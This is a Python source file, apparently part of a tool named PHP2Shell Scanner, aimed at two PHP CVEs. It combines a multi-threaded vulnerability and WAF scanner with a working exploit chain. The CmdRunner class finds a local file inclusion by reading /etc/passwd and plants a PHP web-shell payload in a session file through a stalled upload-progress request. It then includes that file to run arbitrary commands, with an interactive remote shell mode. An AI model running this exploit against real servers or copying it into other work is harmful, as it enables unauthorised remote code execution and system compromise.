class CmdRunner:
    def __init__(self, host, port, tls, path, ui, args):
        self.host, self.port, self.tls, self.path = host, port, tls, path
        self.ui = ui
        self.args = args
        self.sid = "p2s" + uuid.uuid4().hex[:20]
        self.sock = None
        self.boundary = "P2S" + uuid.uuid4().hex[:12]
        self.lfi = None
        self.session_file = None
        self.payload = "<?php echo 'P2S_S';system($_GET['c']);echo 'P2S_E';?>"

    def probe_lfi(self):
        bases = [self.path]
        if self.path == "/":
            bases.append("/index.php")
        for base in bases:
            for param in ((self.args.lfi_param,) if self.args.lfi_param else LFI_PARAMS):
                for probe in ("/etc/passwd", "../../../../etc/passwd"):
                    r = http_req(self.host, self.port, "GET", f"{base}?{param}={probe}",
                                 tls=self.tls, timeout=self.args.timeout)
                    if r.get("error"):
                        continue
                    if b"root:x:0:0" in r["body"] or b"root:*:0:0" in r["body"]:
                        self.lfi = (base, param)
                        return self.lfi
        return None

    def inject(self):
        body = mp_body(self.boundary.encode(), [
            ("PHP_SESSION_UPLOAD_PROGRESS", b"pwn", None),
            ("f", b"Z" * 5120, self.payload),
        ])
        total = len(body) + 100000
        head = (f"POST {self.path} HTTP/1.1\r\nHost: {self.host}\r\n"
                f"User-Agent: {UA}\r\nContent-Type: multipart/form-data; boundary={self.boundary}\r\n"
                f"Content-Length: {total}\r\nCookie: PHPSESSID={self.sid}\r\n"
                f"Connection: close\r\n\r\n").encode("latin-1")
        try:
            sock = _connect(self.host, self.port, tls=self.tls, timeout=self.args.timeout)
            sock.sendall(head + body)
        except (socket.timeout, OSError, ssl.SSLError) as exc:
            return False, str(exc)
        self.sock = sock
        return True, "upload stalled, session file written"

    def trigger(self, cmd):
        if not self.lfi or not self.session_file:
            return None
        base, param = self.lfi
        r = http_req(self.host, self.port, "GET",
                     f"{base}?{param}={quote(self.session_file)}&c={quote(cmd)}",
                     tls=self.tls, timeout=self.args.timeout)
        if r.get("error"):
            return {"ok": False, "error": r["error"], "status": 0}
        body = r["body"].decode("latin-1", "replace")
        if "P2S_S" in body and "P2S_E" in body:
            return {"ok": True, "output": body.split("P2S_S", 1)[1].split("P2S_E", 1)[0].strip(),
                    "status": r["status"]}
        return {"ok": False, "status": r["status"], "error": "marker missing",
                "raw": body[:200]}

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

    def print_output(self, cmd, out):
        c = self.ui.c
        log("")
        log(c("  ╔═ COMMAND EXECUTED " + "═" * 40, Palette.GRN, Palette.BOLD))
        log(c("  ║ ", Palette.GRN) + c("$ " + cmd, Palette.WHT, Palette.BOLD))
        for line in (out.splitlines() or [""]):
            log(c("  ║ ", Palette.GRN) + c(line, Palette.WHT))
        log(c("  ╚" + "═" * 60, Palette.GRN))
        log("")

    def shell(self):
        c = self.ui.c
        log(c("  interactive mode · type exit to quit", Palette.GRY))
        while True:
            try:
                cmd = input(c("  php2shell$ ", Palette.CYA, Palette.BOLD))
            except (EOFError, KeyboardInterrupt):
                log("")
                return
            if cmd.strip() in ("exit", "quit", ""):
                if cmd.strip():
                    return
                continue
            res = self.trigger(cmd)
            if res and res.get("ok"):
                for line in (res["output"].splitlines() or [""]):
                    log("  " + line)
            else:
                log("  " + c(f"[error] {(res or {}).get('error', 'no response')}", Palette.RED))

    def run(self):
        ui = self.ui
        ui.section("Exploit chain · Chain A (session.upload_progress + LFI)")
        found = self.probe_lfi()
        if not found:
            ui.note("No LFI sink found; Chain A cannot be applied.", Palette.ORG)
            ui.note("--cmd only works on targets with an include/require sink.", Palette.GRY)
            ui.end_section()
            return 1, {"result": "NO_LFI_SINK"}
        ui.note(f"LFI: {found[0]}?{found[1]}=<file>", Palette.GRN)
        ok, why = self.inject()
        if not ok:
            ui.note(f"injection failed: {why}", Palette.RED)
            ui.end_section()
            return 1, {"result": "INJECT_FAILED", "error": why}
        ui.note(f"PHPSESSID={self.sid} · {why}", Palette.GRY)
        paths = [self.args.session_path] if self.args.session_path else list(SESSION_CANDIDATES)
        result = None
        for base in paths:
            self.session_file = f"{base}/sess_{self.sid}"
            res = self.trigger(self.args.cmd)
            if res and res.get("ok"):
                result = res
                break
        if not result:
            ui.note("session file unreadable (wrong path or cleanup race); command did not run.",
                    Palette.ORG)
            ui.end_section()
            self.close()
            return 1, {"result": "NOT_EXECUTED", "session_file": self.session_file}
        ui.note(f"session file: {self.session_file}", Palette.GRY)
        ui.end_section()
        self.print_output(self.args.cmd, result["output"])
        if self.args.shell:
            self.shell()
        self.close()
        return 0, {"result": "RCE_CONFIRMED", "session_file": self.session_file,
                   "lfi": f"{found[0]}?{found[1]}=", "sid": self.sid,
                   "cmd": self.args.cmd, "output": result["output"]}


def scan_one(url, args):
    rec = {"target": url, "final_url": None, "verdict": "UNKNOWN", "version": None,
           "version_source": None, "version_vulnerable": None, "version_patched": None,
           "sapi": None, "http_status": None, "upload_progress": False,
           "session_fixation": False, "waf": None, "detail": "", "error": None,
           "redirects": []}
    host, port, tls, path = parse_target(url)
    f = follow(host, port, tls, path, args.timeout)
    r = f["resp"] or {}
    if (not r or r.get("error")) and "://" not in url:
        host, port, tls, path = parse_target("http://" + url)
        f = follow(host, port, tls, path, args.timeout)
        r = f["resp"] or {}
    if not r or r.get("error"):
        rec["verdict"] = "ERROR"
        rec["error"] = f"connection failed ({(r or {}).get('error') or 'unknown'})"
        rec["detail"] = rec["error"]
        return rec
    host, port, tls, path = f["host"], f["port"], f["tls"], f["path"]
    rec["final_url"] = ("https://" if tls else "http://") + f"{host}:{port}{path}"
    rec["redirects"] = f["redirects"]
    rec["http_status"] = r["status"]

    baseline = {"status": r["status"], "headers": r["headers"], "body": r["body"]}
    version = source = None
    for hname in ("x-powered-by", "server"):
        m = PHP_RE.search(r["headers"].get(hname, ""))
        if m:
            version, source = ".".join(m.groups()), hname
            break
    if not version:
        m = PHP_RE.search(r["body"][:16384].decode("utf-8", "replace"))
        if m:
            version, source = ".".join(m.groups()), "body"
    if version:
        vt = tuple(int(x) for x in version.split("."))
        vuln = is_vuln_version(vt)
        rec["version"] = version
        rec["version_source"] = source
        rec["version_vulnerable"] = vuln is True
        rec["version_patched"] = vuln is False
    srv = r["headers"].get("server", "").lower()
    rec["sapi"] = ("mod_php" if "apache" in srv else "fpm" if "nginx" in srv
                   else "litespeed" if "litespeed" in srv else None)

    waf_get = detect_waf(baseline, baseline, method="GET")
    bnd = ("SCAN" + uuid.uuid4().hex[:10]).encode()
    up_body = mp_body(bnd, [("PHP_SESSION_UPLOAD_PROGRESS", b"scancheck", None),
                            ("f", b"X", "test.txt")])
    up = http_req(host, port, "POST", path, tls=tls, timeout=args.timeout, body=up_body,
                  headers={"Content-Type": f"multipart/form-data; boundary={bnd.decode()}"})
    waf_post = detect_waf(up, baseline, method="POST")
    waf = waf_post if waf_post["blocked"] else waf_get
    rec["waf"] = waf if waf["blocked"] else None

    reachable = bool(up.get("status") and "PHPSESSID" in up.get("headers", {}).get("set-cookie", ""))
    rec["upload_progress"] = bool(reachable and not waf["blocked"])

    fix = False
    if up.get("status") and not waf["blocked"]:
        sid = "fixcheck" + uuid.uuid4().hex[:16]
        b2 = ("FIX" + uuid.uuid4().hex[:10]).encode()
        body2 = mp_body(b2, [("PHPSESSID", sid.encode(), None),
                             ("PHP_SESSION_UPLOAD_PROGRESS", b"scancheck", None),
                             ("f", b"X", "test.txt")])
        r2 = http_req(host, port, "POST", path, tls=tls, timeout=args.timeout, body=body2,
                      headers={"Content-Type": f"multipart/form-data; boundary={b2.decode()}"})
        sc = r2.get("headers", {}).get("set-cookie", "")
        fix = sid in sc or ("PHPSESSID" in sc and reachable)
    rec["session_fixation"] = fix

    v = is_vuln_version(tuple(int(x) for x in version.split("."))) if version else None
    cfg = "upload_progress enabled" + (" + body-supplied SID" if fix else "")
    if waf["blocked"]:
        rec["verdict"] = "WAF_BLOCKED"
        risk = ("vulnerable version" if v is True else "patched version" if v is False
                else "version hidden")
        vlabel = VENDOR_LABEL.get(waf["vendor"], waf["vendor"])
        rec["detail"] = (f"{vlabel} block (HTTP {waf['status']}); "
                         f"{risk}; behavioral tier cut at the edge")
    elif v is False:
        rec["verdict"] = "ENGINE_PATCHED"
        rec["detail"] = (f"engine patched; "
                         f"{cfg if reachable else 'injection surface silent'}; "
                         f"residual risk: Chain A (needs LFI)")
    elif v is True:
        rec["verdict"] = "VULNERABLE" if (reachable or fix) else "LIKELY_VULNERABLE"
        rec["detail"] = ("vulnerable version + injection preconditions confirmed"
                         if (reachable or fix) else "vulnerable version, behavioral tier silent")
    elif reachable and fix:
        rec["verdict"] = "LIKELY_VULNERABLE"
        rec["detail"] = "version hidden; upload_progress + body-supplied SID preconditions met"
    elif reachable or fix:
        rec["verdict"] = "SUSPECT"
        rec["detail"] = "version hidden; " + ("upload_progress active" if reachable
                                                else "body-supplied SID")
    else:
        rec["verdict"] = "UNKNOWN"
        rec["detail"] = "no tier produced a signal"
    return rec


def load_targets(args):
    out = []
    if args.target:
        out.append(args.target)
    if args.targets_file:
        with open(args.targets_file, "r", encoding="utf-8", errors="replace") as fh:
            for line in fh:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                out.append(line.split()[0])
    seen, uniq = set(), []
    for t in out:
        key = t.lower().rstrip("/")
        if key not in seen:
            seen.add(key)
            uniq.append(t)
    return uniq


def summary_block(ui, recs, elapsed):
    counts = {}
    for r in recs:
        counts[r["verdict"]] = counts.get(r["verdict"], 0) + 1
    ui.section(f"SUMMARY · {len(recs)} targets · {elapsed:.1f}s")
    total = len(recs) or 1
    for key in ("VULNERABLE", "LIKELY_VULNERABLE", "SUSPECT", "WAF_BLOCKED",
                "ENGINE_PATCHED", "UNKNOWN", "ERROR"):
        n = counts.get(key, 0)
        if not n and key not in ("VULNERABLE", "WAF_BLOCKED"):
            continue
        sym, col = VERDICT_STYLE[key]
        width = int(28 * n / total)
        ui.note(ui.paint(f"{sym} {VERDICT_TEXT[key]:<16}", getattr(Palette, col), Palette.BOLD)
                + ui.paint(f"{n:>4}  ", Palette.WHT) + ui.paint("█" * width, getattr(Palette, col)))
    waf_hosts = [r for r in recs if r["verdict"] == "WAF_BLOCKED"]
    if waf_hosts:
        vendors = {}
        for r in waf_hosts:
            vendors[r["waf"]["vendor"]] = vendors.get(r["waf"]["vendor"], 0) + 1
        ui.note("")
        ui.note("WAF blocks: " + ", ".join(f"{VENDOR_LABEL.get(k, k)}={v}"
                                           for k, v in sorted(vendors.items())), Palette.CYA)
    reached = [r for r in recs if not r.get("waf") and r.get("upload_progress")]
    if reached:
        ui.note("")
        ui.note("Note: a WAF is only reported when a block response comes back; on hosts "
                "where POST reaches the app, detection depends on client fingerprint",
                Palette.YEL)
    ui.end_section()


def write_outputs(recs, args):
    if args.csv:
        with open(args.csv, "w", newline="", encoding="utf-8") as fh:
            w = csv.writer(fh)
            w.writerow(["target", "final_url", "verdict", "version", "version_source",
                        "sapi", "upload_progress", "session_fixation", "waf_vendor",
                        "waf_status", "http_status", "detail"])
            for r in recs:
                waf = r.get("waf") or {}
                w.writerow([r["target"], r["final_url"], r["verdict"], r.get("version") or "",
                            r.get("version_source") or "", r.get("sapi") or "",
                            r["upload_progress"], r["session_fixation"],
                            waf.get("vendor") or "", waf.get("status") or "",
                            r.get("http_status") or "", r.get("detail") or r.get("error") or ""])
    if args.json_out:
        with open(args.json_out, "w", encoding="utf-8") as fh:
            json.dump(recs, fh, indent=2, ensure_ascii=False)


def build_parser():
    p = argparse.ArgumentParser(add_help=True)
    p.add_argument("target", nargs="?")
    p.add_argument("-t", "--targets", dest="targets_file")
    p.add_argument("--threads", type=int, default=6)
    p.add_argument("--timeout", type=float, default=8.0)
    p.add_argument("--csv")
    p.add_argument("--json-out")
    p.add_argument("--no-color", action="store_true")
    p.add_argument("--no-anim", action="store_true")
    p.add_argument("--verbose", action="store_true")
    p.add_argument("--cmd")
    p.add_argument("--shell", action="store_true")
    p.add_argument("--lfi-param")
    p.add_argument("--session-path")
    return p


def main():
    args = build_parser().parse_args()
    if not args.target and not args.targets_file:
        build_parser().print_help()
        return 2
    color = (not args.no_color) and os.getenv("NO_COLOR") is None
    ui = UI(color=color, anim=not args.no_anim)
    targets = load_targets(args)
    ui.banner("PHP2Shell Scanner v3.0",
              "CVE-2026-109618 / CVE-2026-109619 · WAF-aware · Chain A verification")
    ui.info("Targets", f"{len(targets)}")
    ui.info("Threads", args.threads)
    ui.info("Timeout", f"{args.timeout:g}s")
    ui.info("Mode", "active command (--cmd)" if args.cmd else "passive scan")
    t0 = time.time()

    if args.cmd and len(targets) == 1:
        with Spinner(ui, "Passive pre-scan") as sp:
            rec = scan_one(targets[0], args)
            sp.detail = f"{rec['target']} → {VERDICT_TEXT.get(rec['verdict'], rec['verdict'])}"
        ui.result(rec, time.time() - t0)
        write_outputs([rec], args)
        if rec["verdict"] == "ERROR":
            log("")
            ui.note(f"target unreachable: {rec.get('error')}", Palette.RED)
            return 1
        if rec.get("waf"):
            log("")
            ui.note(f"WAF: {VENDOR_LABEL.get(rec['waf']['vendor'])} · {rec['waf']['evidence']}",
                    Palette.ORG)
            ui.note("the behavioral tier may have been cut at the edge by this block.",
                    Palette.GRY)
        host, port, tls, path = parse_target(rec["final_url"] or targets[0])
        runner = CmdRunner(host, port, tls, path, ui, args)
        code, info = runner.run()
        info.update({"target": rec["target"], "verdict": rec["verdict"],
                     "version": rec.get("version")})
        with open("cmd_evidence.json", "w", encoding="utf-8") as fh:
            json.dump(info, fh, indent=2, ensure_ascii=False)
        if code == 0:
            log("")
            ui.note("evidence file: ./cmd_evidence.json", Palette.GRY)
        return code

    def timed(target):
        start = time.time()
        result = scan_one(target, args)
        result["elapsed"] = time.time() - start
        return result

    recs = []
    with ThreadPoolExecutor(max_workers=max(1, args.threads)) as pool:
        futs = {pool.submit(timed, t): t for t in targets}
        done = 0
        for fut in as_completed(futs):
            done += 1
            try:
                rec = fut.result()
            except Exception as exc:
                rec = {"target": futs[fut], "verdict": "ERROR", "version": None, "waf": None,
                       "detail": f"internal error: {exc}", "error": str(exc), "final_url": None,
                       "upload_progress": False, "session_fixation": False}
            recs.append(rec)
            ui.bar(done, len(targets), rec["target"][:30], "")
            ui.result(rec, rec.get("elapsed", 0.0))
            if args.verbose:
                detail = rec.get("detail") or rec.get("error") or ""
                if rec.get("waf"):
                    detail += f"  ·  {rec['waf']['evidence']}"
                if detail:
                    ui.emit(ui.paint(f"       └ {detail}", Palette.DIM))
    ui.finish()
    order = {k: i for i, k in enumerate(["VULNERABLE", "LIKELY_VULNERABLE", "SUSPECT",
                                         "WAF_BLOCKED", "ENGINE_PATCHED", "UNKNOWN", "ERROR"])}
    recs.sort(key=lambda r: (order.get(r["verdict"], 9), r["target"]))
    summary_block(ui, recs, time.time() - t0)
    write_outputs(recs, args)
    for path in filter(None, [args.csv, args.json_out]):
        ui.note(f"written: {path}", Palette.GRY)
    return 0


if __name__ == "__main__":
    sys.exit(main())
